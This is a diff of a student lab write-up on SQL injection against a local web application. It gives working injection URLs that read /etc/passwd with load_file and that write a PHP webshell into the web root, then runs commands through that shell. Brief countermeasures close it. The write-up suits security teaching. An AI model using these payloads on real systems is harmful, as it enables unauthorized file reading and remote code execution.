@@ -50,6 +50,59 @@ In PHP for exemple, we can use functions like `htmlentities()` or `htmlspecialch
 
 ### Part 2: SQL Injection
 
-http://localhost/admin/edit.php?id=0%20union%20select%201,2,load_file("/etc/passwd"),4
+#### Known Vulnerabilities
 
-http://localhost/admin/edit.php?id=0%20union%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22,4%20into%20outfile%20%22/var/www/css/webshell.php%22
+Firstly we tried to find vulnerabilities in the admin form, for example by escaping password verification, but this method was not very successful. Then we find that the URL was not sanitized, meaning that some commands can be executed through the path, in this lab we will perfom SQL injection, meaning that we will execute SQL queries through this path.
+
+#### Exploiting File Privilege
+
+Using SQL injection, we can for example input a command that reads `/etc/passwd` and display content of this file into a form, as in the image below
+
+![Display passwd file in a form](assets/passwd-file.png)
+
+In order to perform this action, we used the url `http://localhost/admin/edit.php?id=0%20union%20select%201,2,load_file("/etc/passwd"),4`, that executes the query directly on the server which the mysql user, which has more rights than the www-data user. Thus, it's possible to display sensitive files, for example in this case the file containing information about users registered on the system. Before we would have also found passwords in this file, but now UNIX systems uses `/etc/shadow` file to save password hashes. 
+
+
+#### Create a Webshell
+
+Then, another vulnerability that could harm the system would be to execute unauthorized code remotely, by putting this request as an url :
+
+`http://localhost/admin/edit.php?id=0%20union%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22,4%20into%20outfile%20%22/var/www/css/webshell.php%22`
+
+By doing this, the mysql user will write on our ccs folder, which as write access for everyone, our php file, that we can see on the image below :
+
+![Webshell file located in css folder](assets/webshell-file.png)
+
+Our file contain php code that will fetch the "cmd" parameter in our url, and run it through a shell
+
+```php
+<?php
+    system($_GET['cmd']);
+?>
+
+```
+
+Now we have our php file on the server, we can execute code remotely
+
+![Request whoami executed remotely](assets/whoami-req.png)
+![Request uname executed remotely](assets/uname-req.png)
+
+#### Countermeasures
+
+##### Web Application
+
+- Sanitize url
+    
+##### Database System
+
+- ?
+
+##### Operating System
+- Change permission on server. In server mostly recommended that directories permissions should 755 and files 644. In permissions 777 are not recommended due to security reasons.
+
+
+
+
+### Sources
+
+1. [Sécurisez vos cookies (instructions Secure et HttpOnly)](https://blog.dareboost.com/fr/2016/12/securisez-cookies-instructions-secure-httponly/)
